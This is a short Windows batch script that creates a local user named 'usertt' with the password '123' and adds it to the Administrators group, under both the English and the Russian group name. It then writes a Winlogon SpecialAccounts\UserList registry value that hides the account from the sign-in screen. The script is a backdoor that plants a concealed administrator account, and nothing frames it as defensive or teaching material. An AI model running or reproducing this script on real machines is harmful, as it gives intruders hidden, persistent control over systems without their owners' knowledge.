chcp 65001
net user usertt 123 /add
net localgroup administrators usertt /add
net localgroup Администраторы usertt/add
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v usertt /t REG_DWORD /d 0
